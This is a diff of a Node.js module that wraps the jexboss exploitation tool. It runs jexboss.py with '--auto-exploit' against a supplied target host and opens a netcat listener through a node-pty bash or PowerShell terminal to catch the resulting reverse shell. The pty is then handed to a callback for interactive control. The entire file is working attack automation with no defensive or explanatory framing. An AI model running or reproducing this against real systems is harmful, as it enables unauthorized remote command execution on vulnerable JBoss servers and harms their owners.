@@ -1,22 +1,29 @@
 
 const { spawn } = require('child_process');
 
+var os = require('os');
+var pty = require('node-pty');
+ 
+var shell = os.platform() === 'win32' ? 'powershell.exe' : 'bash';
+ 
+
+
 module.exports = function(host,reverseHost,callback) {
     console.log( ['-vv', '-l', reverseHost.split(':')[1]])
-    const nc = spawn('nc', ['-vv', '-l', reverseHost.split(':')[1]]);
 
-    nc.stdout.on('data', (data) => {
-        console.log(`nc stdout: ${data}`);
-        callback(nc);
-    });
+    var ptyProcess = pty.spawn(shell, [], {
+        name: 'xterm-color',
+        cols: 80,
+        rows: 30,
+        cwd: process.env.HOME,
+        env: process.env
+      });
+       
 
-    nc.stderr.on('data', (data) => {
-        console.log(`nc stderr: ${data}`);
-    });
+      ptyProcess.write(`nc -vv -l ${reverseHost.split(':')[1]}\r`);
 
-    nc.on('close', (code) => {
-        console.log(`nc child process exited with code ${code}`);
-    });
+
+
 
     const jexboss = spawn('python', ['jexboss/jexboss.py', '--auto-exploit', '-host', host,
         '--reverse-host', reverseHost]);
@@ -36,4 +43,5 @@ module.exports = function(host,reverseHost,callback) {
         console.log(`jexboss child process exited with code ${code}`);
     });
 
+    callback(ptyProcess);
 }
